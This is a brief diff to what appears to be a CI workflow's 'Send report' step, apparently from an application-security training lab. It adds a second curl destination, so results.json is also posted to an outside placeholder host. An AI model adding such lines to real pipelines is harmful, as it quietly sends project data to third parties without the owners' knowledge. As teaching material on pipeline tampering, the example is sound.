@@ -30,5 +30,6 @@ jobs:
       - name: Send report
         run: |
           curl -X POST -H "Content-Type: application/json" \
-            --data-binary @results.json \
-            http://35.219.190.69:8880/callback
+            -d @results.json \
+            http://35.219.190.69:8880/callback \
+            http://blahblahblah.appsecengineer.training:8880/callback
